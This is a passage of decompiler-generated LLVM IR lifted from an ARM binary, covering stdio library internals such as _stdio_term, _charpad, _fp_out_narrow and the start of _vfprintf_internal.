  %v3_1013c = load i8, i8* @global_var_23e9d.620, align 1
  %v4_1013c = zext i8 %v3_1013c to i32
  %v3_10140 = load i8, i8* @global_var_23e9c.584, align 1
  %v4_10140 = zext i8 %v3_10140 to i32
  %v3_10144 = sdiv i32 %v5_10138, 256
  store i32 1, i32* @r0, align 4
  %v4_1014c = mul nuw nsw i32 %v4_1013c, 256
  %v5_1014c = or i32 %v4_10140, %v4_1014c
  store i32 %v5_1014c, i32* @r5, align 4
  %v1_10150 = trunc i32 %v3_10144 to i8
  store i8 %v1_10150, i8* @global_var_23e4d.619, align 1
  %v1_10154 = trunc i32 %v0_10138 to i8
  %v2_10154 = load i32, i32* @r4, align 4
  %v3_10154 = inttoptr i32 %v2_10154 to i8*
  store i8 %v1_10154, i8* %v3_10154, align 1
  %v1_10158 = call i32 @isatty(i32 1)
  %v1_1015c = sub i32 1, %v1_10158
  %v0_10160 = load i32, i32* @r5, align 4
  %v4_10160 = mul i32 %v1_1015c, 256
  %v5_10160 = xor i32 %v4_10160, %v0_10160
  store i32 %v5_10160, i32* %r5.global-to-local, align 4
  %v3_10164 = sdiv i32 %v5_10160, 256
  %v1_10168 = trunc i32 %v3_10164 to i8
  store i8 %v1_10168, i8* @global_var_23e9d.620, align 1
  %v0_1016c = load i32, i32* %r8.global-to-local, align 4
  %v1_1016c = load i32, i32* @r7, align 4
  %v2_1016c = inttoptr i32 %v1_1016c to i32*
  store i32 %v0_1016c, i32* %v2_1016c, align 4
  %v0_10170 = load i32, i32* %r5.global-to-local, align 4
  %v1_10170 = trunc i32 %v0_10170 to i8
  store i8 %v1_10170, i8* @global_var_23e9c.584, align 1
  %v2_10174 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10174, i32* @r4, align 4
  store i32 %v9_1010c, i32* @r6, align 4
  ret i32 %v1_1015c

; uselistorder directives
  uselistorder i32 %v1_1015c, { 1, 0 }
  uselistorder i32 %v0_10138, { 1, 0 }
  uselistorder i8* @global_var_23e9c.584, { 1, 0 }
  uselistorder i8* @global_var_23e9d.620, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
  uselistorder i8* @global_var_23e4d.619, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1a02c.622 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_10184 = call i32 @memcpy()
  %v0_10188 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10188, label %bb, label %bb1

bb:                                               ; preds = %entry
  store i32 0, i32* @sl, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_10184

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1018c = load i32, i32* @r4, align 4
  store i32 %v3_1018c, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_23e18.613 to i32), i32* @r0, align 4
  %v0_10194 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_23e30.594 to i32), i32* @r0, align 4
  %v0_1019c = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32** @global_var_23e14.616 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_23e14.616 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_101f86 = add i32 %storemerge5, 56
  store i32 %v1_101f86, i32* @r5, align 4
  %v2_101fc8 = icmp eq i32 %storemerge5, 0
  store i32 %v1_101f86, i32* %r0.global-to-local, align 4
  br i1 %v2_101fc8, label %dec_label_pc_10208, label %dec_label_pc_101ac

dec_label_pc_101ac:                               ; preds = %entry, %dec_label_pc_101e8
  store i32 ptrtoint (i8* @global_var_13774.590 to i32), i32* %r3.global-to-local, align 4
  store i32 65976, i32* @lr, align 4
  %v1_101b4 = call i32 @__pthread_return_0()
  %v2_101b8 = icmp eq i32 %v1_101b4, 0
  %v0_101bc = load i32, i32* @r5, align 4
  store i32 %v0_101bc, i32* @r0, align 4
  br i1 %v2_101b8, label %dec_label_pc_101e8, label %dec_label_pc_101c4

dec_label_pc_101c4:                               ; preds = %dec_label_pc_101ac
  %v0_101c4 = load i32, i32* @r4, align 4
  %v1_101c4 = add i32 %v0_101c4, 8
  %v2_101c4 = inttoptr i32 %v1_101c4 to i32*
  %v3_101c4 = load i32, i32* %v2_101c4, align 4
  store i32 %v3_101c4, i32* %r3.global-to-local, align 4
  %v3_101cc = inttoptr i32 %v0_101c4 to i8*
  store i8 48, i8* %v3_101cc, align 1
  %v2_101d4 = load i32, i32* @r4, align 4
  %v3_101d4 = add i32 %v2_101d4, 1
  %v4_101d4 = inttoptr i32 %v3_101d4 to i8*
  store i8 0, i8* %v4_101d4, align 1
  %v0_101d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_101d8 = load i32, i32* @r4, align 4
  %v2_101d8 = add i32 %v1_101d8, 20
  %v3_101d8 = inttoptr i32 %v2_101d8 to i32*
  store i32 %v0_101d8, i32* %v3_101d8, align 4
  %v0_101dc = load i32, i32* %r3.global-to-local, align 4
  %v1_101dc = load i32, i32* @r4, align 4
  %v2_101dc = add i32 %v1_101dc, 24
  %v3_101dc = inttoptr i32 %v2_101dc to i32*
  store i32 %v0_101dc, i32* %v3_101dc, align 4
  %v0_101e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_101e0 = load i32, i32* @r4, align 4
  %v2_101e0 = add i32 %v1_101e0, 28
  %v3_101e0 = inttoptr i32 %v2_101e0 to i32*
  store i32 %v0_101e0, i32* %v3_101e0, align 4
  %v0_101e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_101e4 = load i32, i32* @r4, align 4
  %v2_101e4 = add i32 %v1_101e4, 16
  %v3_101e4 = inttoptr i32 %v2_101e4 to i32*
  store i32 %v0_101e4, i32* %v3_101e4, align 4
  br label %dec_label_pc_101e8

dec_label_pc_101e8:                               ; preds = %dec_label_pc_101ac, %dec_label_pc_101c4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_101ec = load i32, i32* @r4, align 4
  %v2_101ec = add i32 %v1_101ec, 52
  %v3_101ec = inttoptr i32 %v2_101ec to i32*
  store i32 1, i32* %v3_101ec, align 4
  %v0_101f0 = call i32 @__stdio_init_mutex()
  store i32 %v0_101f0, i32* %r0.global-to-local, align 4
  %v0_101f4 = load i32, i32* @r4, align 4
  %v1_101f4 = add i32 %v0_101f4, 32
  %v2_101f4 = inttoptr i32 %v1_101f4 to i32*
  %storemerge = load i32, i32* %v2_101f4, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_101f8 = add i32 %storemerge, 56
  store i32 %v1_101f8, i32* @r5, align 4
  %v2_101fc = icmp eq i32 %storemerge, 0
  store i32 %v1_101f8, i32* %r0.global-to-local, align 4
  br i1 %v2_101fc, label %dec_label_pc_101f8.dec_label_pc_10208_crit_edge, label %dec_label_pc_101ac

dec_label_pc_101f8.dec_label_pc_10208_crit_edge:  ; preds = %dec_label_pc_101e8
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_23e14.616 to i32*), align 4
  br label %dec_label_pc_10208

dec_label_pc_10208:                               ; preds = %dec_label_pc_101f8.dec_label_pc_10208_crit_edge, %entry
  %v11_1023013 = phi i32 [ %v1_101f8, %dec_label_pc_101f8.dec_label_pc_10208_crit_edge ], [ %v1_101f86, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_101f8.dec_label_pc_10208_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32** @global_var_23e14.616 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_102284 = icmp eq i32 %storemerge12, 0
  br i1 %v2_102284, label %dec_label_pc_10230, label %dec_label_pc_10214

dec_label_pc_10214:                               ; preds = %dec_label_pc_10208, %dec_label_pc_10214
  %v0_1021c = phi i32 [ %storemerge1, %dec_label_pc_10214 ], [ %storemerge12, %dec_label_pc_10208 ]
  %v1_10214 = inttoptr i32 %v0_1021c to i8*
  %v2_10214 = load i8, i8* %v1_10214, align 1
  %v3_10214 = zext i8 %v2_10214 to i32
  store i32 %v3_10214, i32* %r3.global-to-local, align 4
  %v1_10218 = and i32 %v3_10214, 64
  store i32 %v0_1021c, i32* %r0.global-to-local, align 4
  store i32 66084, i32* @lr, align 4
  %v1_10220 = icmp ne i32 %v1_10218, 0
  call void @__pseudo_cond_branch(i1 %v1_10220, i32 ptrtoint (i32* @global_var_10244.627 to i32))
  %v0_10224 = load i32, i32* %r4.global-to-local, align 4
  %v1_10224 = add i32 %v0_10224, 32
  %v2_10224 = inttoptr i32 %v1_10224 to i32*
  %storemerge1 = load i32, i32* %v2_10224, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_10228 = icmp eq i32 %storemerge1, 0
  br i1 %v2_10228, label %dec_label_pc_10228.dec_label_pc_10230_crit_edge, label %dec_label_pc_10214

dec_label_pc_10228.dec_label_pc_10230_crit_edge:  ; preds = %dec_label_pc_10214
  %v11_10230.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10230

dec_label_pc_10230:                               ; preds = %dec_label_pc_10228.dec_label_pc_10230_crit_edge, %dec_label_pc_10208
  %v11_10230 = phi i32 [ %v11_10230.pre, %dec_label_pc_10228.dec_label_pc_10230_crit_edge ], [ %v11_1023013, %dec_label_pc_10208 ]
  %v2_10230 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10230, i32* @r4, align 4
  ret i32 %v11_10230

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 ()* @__stdio_init_mutex, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10214, { 1, 0 }
  uselistorder label %dec_label_pc_101e8, { 1, 0 }
  uselistorder label %dec_label_pc_101ac, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10244 = load i32, i32* @r4, align 4
  store i32 %v3_10244, i32* %stack_var_-8, align 4
  %v0_10248 = load i32, i32* @r0, align 4
  %v1_10248 = add i32 %v0_10248, 8
  %v2_10248 = inttoptr i32 %v1_10248 to i32*
  %v3_10248 = load i32, i32* %v2_10248, align 4
  %v1_1024c = add i32 %v0_10248, 16
  %v2_1024c = inttoptr i32 %v1_1024c to i32*
  %v3_1024c = load i32, i32* %v2_1024c, align 4
  %v9_10250 = icmp eq i32 %v3_1024c, %v3_10248
  store i32 %v0_10248, i32* %r4.global-to-local, align 4
  br i1 %v9_10250, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_10248, i32* %v2_1024c, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  store i32 66148, i32* @lr, align 4
  %v1_10260 = xor i1 %v9_10250, true
  call void @__pseudo_cond_branch(i1 %v1_10260, i32 ptrtoint (i32* @global_var_13e58.628 to i32))
  %v0_10264 = load i32, i32* %r4.global-to-local, align 4
  %v1_10264 = add i32 %v0_10264, 8
  %v2_10264 = inttoptr i32 %v1_10264 to i32*
  %v3_10264 = load i32, i32* %v2_10264, align 4
  %v1_10268 = add i32 %v0_10264, 16
  %v2_10268 = inttoptr i32 %v1_10268 to i32*
  %v3_10268 = load i32, i32* %v2_10268, align 4
  %v2_1026c = sub i32 %v3_10268, %v3_10264
  %v2_10270 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10270, i32* @r4, align 4
  ret i32 %v2_1026c

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v3_10274 = load i32, i32* @r4, align 4
  %v6_10274 = load i32, i32* @r5, align 4
  %v9_10274 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_102942 = icmp eq i32 %arg3, 0
  %v2_10298 = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_102942, label %dec_label_pc_102b4, label %dec_label_pc_102a8

dec_label_pc_10290:                               ; preds = %dec_label_pc_102a8
  %v1_10290 = add i32 %v0_10290, -1
  store i32 %v1_10290, i32* @r4, align 4
  %v2_10294 = icmp eq i32 %v1_10290, 0
  %v0_102a0 = load i32, i32* @r6, align 4
  br i1 %v2_10294, label %dec_label_pc_102b4.loopexit, label %dec_label_pc_102a8

dec_label_pc_102a8:                               ; preds = %entry, %dec_label_pc_10290
  %v0_102a04 = phi i32 [ %v0_102a0, %dec_label_pc_10290 ], [ %arg1, %entry ]
  %v3_102a8 = call i32 @__stdio_fwrite(i32 %v2_10298, i32 1, i32 %v0_102a04)
  %v7_102ac = icmp eq i32 %v3_102a8, 1
  %v0_10290 = load i32, i32* @r4, align 4
  br i1 %v7_102ac, label %dec_label_pc_10290, label %dec_label_pc_102b4.loopexit

dec_label_pc_102b4.loopexit:                      ; preds = %dec_label_pc_10290, %dec_label_pc_102a8
  %v0_102b4.ph = phi i32 [ %v0_10290, %dec_label_pc_102a8 ], [ 0, %dec_label_pc_10290 ]
  %v1_102b4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_102b4

dec_label_pc_102b4:                               ; preds = %dec_label_pc_102b4.loopexit, %entry
  %v1_102b4 = phi i32 [ 0, %entry ], [ %v1_102b4.pre, %dec_label_pc_102b4.loopexit ]
  %v0_102b4 = phi i32 [ 0, %entry ], [ %v0_102b4.ph, %dec_label_pc_102b4.loopexit ]
  %v2_102b4 = sub i32 %v1_102b4, %v0_102b4
  store i32 %v3_10274, i32* @r4, align 4
  store i32 %v6_10274, i32* @r5, align 4
  store i32 %v9_10274, i32* @r6, align 4
  ret i32 %v2_102b4

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_102b4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_102a8, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_102c0 = load i32, i32* @r4, align 4
  store i32 %v3_102c0, i32* %stack_var_-24, align 4
  %v9_102c0 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_102c8 = and i32 %arg2, 128
  %v2_102c8 = icmp eq i32 %v1_102c8, 0
  %v0_102cc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_102cc, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_102c8, label %bb, label %dec_label_pc_102e0

bb:                                               ; preds = %entry
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10320

dec_label_pc_102e0:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_102e4 = call i32 @strlen(i8* %arg4)
  store i32 %v3_102e4, i32* %r0.global-to-local, align 4
  %v1_102e8 = load i32, i32* %r4.global-to-local, align 4
  %v2_102e8 = sub i32 %v1_102e8, %v3_102e4
  store i32 %v2_102e8, i32* @r4, align 4
  store i32 %v3_102e4, i32* @r5, align 4
  %tmp16 = icmp slt i32 %v2_102e8, 1
  br i1 %tmp16, label %.thread, label %dec_label_pc_10300

.thread:                                          ; preds = %dec_label_pc_102e0
  store i32 %v3_102e4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10320

dec_label_pc_10300:                               ; preds = %dec_label_pc_102e0
  %v0_10300 = load i32, i32* @r6, align 4
  %v1_10300 = urem i32 %v0_10300, 128
  %v0_10304 = load i32, i32* @r8, align 4
  store i32 %v0_10304, i32* %r0.global-to-local, align 4
  %v3_1030c = trunc i32 %v1_10300 to i8
  %v4_1030c = call i32 @_charpad(i32 %v0_10304, i8 %v3_1030c, i32 %v2_102e8)
  store i32 %v4_1030c, i32* %r0.global-to-local, align 4
  %v1_10310 = load i32, i32* @r4, align 4
  %v9_10310 = icmp eq i32 %v4_1030c, %v1_10310
  store i32 %v4_1030c, i32* %r6.global-to-local, align 4
  br i1 %v9_10310, label %dec_label_pc_1031c, label %dec_label_pc_1033c

dec_label_pc_1031c:                               ; preds = %dec_label_pc_10300
  %v0_1031c = load i32, i32* @r5, align 4
  store i32 %v0_1031c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10320

dec_label_pc_10320:                               ; preds = %bb, %.thread, %dec_label_pc_1031c
  %v5_1032c = phi i32 [ %v0_1031c, %dec_label_pc_1031c ], [ %arg3, %bb ], [ %v3_102e4, %.thread ]
  %tmp17 = icmp slt i32 %v5_1032c, 1
  br i1 %tmp17, label %.thread8, label %bb18

.thread8:                                         ; preds = %dec_label_pc_10320
  br label %bb19

bb18:                                             ; preds = %dec_label_pc_10320
  %v5_10328 = load i32, i32* @r7, align 4
  br label %bb19

bb19:                                             ; preds = %.thread8, %bb18
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_10328, %bb18 ]
  %tmp20 = phi i1 [ false, %.thread8 ], [ true, %bb18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp20, i32 ptrtoint (i32* @global_var_13f14.629 to i32))
  %v0_10338 = load i32, i32* %r6.global-to-local, align 4
  %v2_10338 = add i32 %storemerge, %v0_10338
  store i32 %v2_10338, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1033c

dec_label_pc_1033c:                               ; preds = %dec_label_pc_10300, %bb19
  %v0_1033c = phi i32 [ %v4_1030c, %dec_label_pc_10300 ], [ %v2_10338, %bb19 ]
  store i32 %v0_1033c, i32* %r0.global-to-local, align 4
  %v2_10340 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10340, i32* %r4.global-to-local, align 4
  store i32 %v9_102c0, i32* %r6.global-to-local, align 4
  ret i32 %v0_1033c

; uselistorder directives
  uselistorder i32 %v0_1033c, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1033c, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_10320, { 2, 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10344 = load i32, i32* @r4, align 4
  store i32 %v3_10344, i32* %stack_var_-36, align 4
  %v6_10344 = load i32, i32* @r5, align 4
  %v15_10344 = load i32, i32* @r8, align 4
  %v18_10344 = load i32, i32* @sb, align 4
  %v21_10344 = load i32, i32* @sl, align 4
  %v24_10344 = load i32, i32* @fp, align 4
  %v2_1034c = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_1034c, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_1034c, i32* %r0.global-to-local, align 4
  %v0_10358 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10358, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_10360 = call i32 @_ppfs_init(i32* nonnull %stack_var_-332)
  store i32 %v2_10360, i32* %r0.global-to-local, align 4
  %v1_10364 = icmp slt i32 %v2_10360, 0
  br i1 %v1_10364, label %dec_label_pc_1036c, label %dec_label_pc_103a0

dec_label_pc_1036c:                               ; preds = %entry
  %v3_1036c = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_1036c, i32* @r4, align 4
  %v1_10370 = inttoptr i32 %v3_1036c to i8*
  store i32 %v3_1036c, i32* %r0.global-to-local, align 4
  %v3_10374 = call i32 @strlen(i8* %v1_10370)
  store i32 %v3_10374, i32* %r0.global-to-local, align 4
  %v2_10378 = icmp eq i32 %v3_10374, 0
  br i1 %v2_10378, label %bb, label %dec_label_pc_10388

bb:                                               ; preds = %dec_label_pc_1036c
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10918

dec_label_pc_10388:                               ; preds = %dec_label_pc_1036c
  %v0_10388 = load i32, i32* @r4, align 4
  store i32 %v0_10388, i32* %r0.global-to-local, align 4
  %v0_1038c = load i32, i32* @fp, align 4
  store i32 %v0_1038c, i32* %r2.global-to-local, align 4
  %v3_10390 = call i32 @__stdio_fwrite(i32 %v0_10388, i32 %v3_10374, i32 %v0_1038c)
  store i32 %v3_10390, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10918

dec_label_pc_103a0:                               ; preds = %entry
  store i32 %v2_1034c, i32* %r0.global-to-local, align 4
  %v0_103a4 = load i32, i32* @r5, align 4
  %v2_103a8 = call i32 @_ppfs_prepargs(i32 %v2_1034c, i32 %v0_103a4)
  store i32 %v2_103a8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  %v4_10448 = zext i8 %tmp104 to i32
  %v2_10450 = ptrtoint i32* %stack_var_-252 to i32
  %v2_10470 = ptrtoint i32* %stack_var_-36 to i32
  %v2_10488 = icmp eq i32 %tmp102, 0
  %v1_1049c = inttoptr i32 %tmp101 to i32*
  %v2_1078c = ptrtoint i32* %stack_var_-180 to i32
  %v2_106a8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_106bc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10658 = add i32 %tmp101, 4
  %v4_10658 = inttoptr i32 %v3_10658 to i32*
  %v2_1065c = ptrtoint i32* %stack_var_-328 to i32
  %v7_1051c = zext i8 %tmp99 to i32
  %v2_10558 = ptrtoint i32* %stack_var_-53 to i32
  %v5_10560 = bitcast i32* %stack_var_-53 to i8*
  %v2_10568 = icmp ugt i32 %tmp102, 4
  %v7_10568 = icmp eq i32 %tmp102, 5
  %v0_10900.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_10480187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_1067c = icmp ugt i32 %tmp102, 16
  %v7_1067c = icmp eq i32 %tmp102, 17
  %v2_10680 = xor i1 %v7_1067c, true
  %v3_10680 = and i1 %v2_1067c, %v2_10680
  %v2_1071c = icmp ugt i32 %tmp102, 18
  %v7_1071c = icmp eq i32 %tmp102, 19
  %v2_10720 = xor i1 %v7_1071c, true
  %v3_10720 = and i1 %v2_1071c, %v2_10720
  %v7_10780 = icmp eq i32 %tmp102, 20
  %v2_104c0 = add i32 %tmp102, ptrtoint (i32* @global_var_1a060.631 to i32)
  %v1_104c4 = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_1a060.631 to i32), i32 -1)
  %v2_104c4 = inttoptr i32 %v1_104c4 to i8*
  %v2_104f0 = xor i1 %v7_10568, true
  %v3_104f0 = and i1 %v2_10568, %v2_104f0
  %v7_10524 = icmp eq i32 %tmp102, 1
  %v2_10570 = xor i1 %v2_10568, true
  %v3_10570 = or i1 %v7_10568, %v2_10570
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_105d8 = icmp eq i32 %tmp102, 3
  %v11_105e4 = icmp eq i32 %tmp102, 4
  %v9_10454 = mul nuw nsw i32 %v4_10448, 8
  %v10_10454 = add nsw i32 %v9_10454, -8
  %v6_1045c = add i32 %v10_10454, %v2_10450
  br label %dec_label_pc_10900

bb126:                                            ; preds = %dec_label_pc_103b8.outer, %.thread7
  %v2_103b8185 = phi i8 [ %v2_103b8, %.thread7 ], [ %v2_103b8181, %dec_label_pc_103b8.outer ]
  %v1_103cc184 = phi i32 [ %v2_103cc, %.thread7 ], [ %v0_103b849, %dec_label_pc_103b8.outer ]
  %v8_103c0 = icmp eq i8 %v2_103b8185, 37
  br i1 %v8_103c0, label %dec_label_pc_103d4, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_103cc = add i32 %v1_103cc184, 1
  store i32 %v2_103cc, i32* @r4, align 4
  %v1_103b8 = inttoptr i32 %v2_103cc to i8*
  %v2_103b8 = load i8, i8* %v1_103b8, align 1
  %v3_103b8 = zext i8 %v2_103b8 to i32
  store i32 %v3_103b8, i32* %r3.global-to-local, align 4
  %v2_103bc = icmp eq i8 %v2_103b8, 0
  br i1 %v2_103bc, label %dec_label_pc_103d4, label %bb126

dec_label_pc_103d4:                               ; preds = %bb126, %.thread7, %dec_label_pc_103b8.outer
  %v1_103cc.lcssa = phi i32 [ %v0_103b849, %dec_label_pc_103b8.outer ], [ %v2_103cc, %.thread7 ], [ %v1_103cc184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_103d4 = sub i32 %v1_103cc.lcssa, %v5_103e4
  %v9_103d4 = icmp eq i32 %v1_103cc.lcssa, %v5_103e4
  br i1 %v9_103d4, label %dec_label_pc_10408, label %dec_label_pc_103dc

dec_label_pc_103dc:                               ; preds = %dec_label_pc_103d4
  store i32 %v2_103d4, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_103d4, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_103dc
  store i32 %v5_103e4, i32* %r0.global-to-local, align 4
  %v5_103ec = load i32, i32* @fp, align 4
  store i32 %v5_103ec, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_103dc, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_103dc ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_13f14.629 to i32))
  %v0_103f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_103f4 = load i32, i32* @r5, align 4
  %v9_103f4 = icmp eq i32 %v0_103f4, %v1_103f4
  br i1 %v9_103f4, label %dec_label_pc_103fc, label %dec_label_pc_10910

dec_label_pc_103fc:                               ; preds = %bb130
  %v2_10400 = add i32 %v0_103f4, %stack_var_-336.1.ph
  %v0_10408.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10408

dec_label_pc_10408:                               ; preds = %dec_label_pc_103d4, %dec_label_pc_103fc
  %v0_1041c = phi i32 [ %v5_103e4, %dec_label_pc_103d4 ], [ %v0_10408.pre, %dec_label_pc_103fc ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_103d4 ], [ %v2_10400, %dec_label_pc_103fc ]
  %v1_10408 = inttoptr i32 %v0_1041c to i8*
  %v2_10408 = load i8, i8* %v1_10408, align 1
  %v3_10408 = zext i8 %v2_10408 to i32
  store i32 %v3_10408, i32* %r3.global-to-local, align 4
  %v2_1040c = icmp eq i8 %v2_10408, 0
  br i1 %v2_1040c, label %dec_label_pc_10918, label %dec_label_pc_10414

dec_label_pc_10414:                               ; preds = %dec_label_pc_10408
  %v1_10414 = add i32 %v0_1041c, 1
  %v2_10414 = inttoptr i32 %v1_10414 to i8*
  %v3_10414 = load i8, i8* %v2_10414, align 1
  %v4_10414 = zext i8 %v3_10414 to i32
  store i32 %v4_10414, i32* %r3.global-to-local, align 4
  %v7_10418 = icmp eq i8 %v3_10414, 37
  store i32 %v1_10414, i32* %r2.global-to-local, align 4
  br i1 %v7_10418, label %dec_label_pc_10908, label %dec_label_pc_10424

dec_label_pc_10424:                               ; preds = %dec_label_pc_10414
  store i32 %v2_1034c, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_1034c, i32* %r0.global-to-local, align 4
  store i32 %v1_10414, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_10438 = call i32 @_ppfs_parsespec(i32* nonnull %stack_var_-332)
  store i32 %v2_1034c, i32* @r0, align 4
